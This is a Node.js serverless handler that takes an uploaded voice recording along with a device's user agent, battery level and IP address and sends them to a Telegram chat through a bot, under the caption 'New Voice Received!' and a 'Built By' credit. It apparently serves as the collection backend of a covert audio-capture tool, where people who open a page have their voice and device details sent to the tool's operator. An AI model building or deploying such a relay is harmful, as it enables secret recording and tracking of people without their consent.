import { Telegraf } from 'telegraf';
import formidable from 'formidable-serverless';
import fs from 'fs';

const bot = new Telegraf(process.env.BOT_TOKEN);

export const config = {
  api: {
    bodyParser: false,
  }
};

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send("Only POST allowed");

  const form = new formidable.IncomingForm();

  form.parse(req, async (err, fields, files) => {
    try {
      const uid = fields.uid;
      const info = JSON.parse(fields.info || '{}');
      const voiceFile = files.voice;

      if (!uid || !voiceFile) return res.status(400).send("Missing data");

      const caption = 
`🎤 *New Voice Received!*

📱 *Device:* \`${info.ua || "Unknown"}\`
🔋 *Battery:* \`${info.battery || "?"}\`
🌐 *IP:* \`${info.ip || "?"}\`

🕒 *Time:* \`${new Date().toLocaleString("en-US", { timeZone: "Asia/Kabul" })}\`

🧑🏻‍💻 Built By: *WACIQ*
`;

      await bot.telegram.sendVoice(uid, { source: fs.createReadStream(voiceFile.filepath) }, {
        caption,
        parse_mode: 'Markdown'
      });

      res.status(200).send("✅ Voice delivered");
    } catch (err) {
      console.error(err);
      res.status(500).send("❌ Error sending voice");
    }
  });
} 
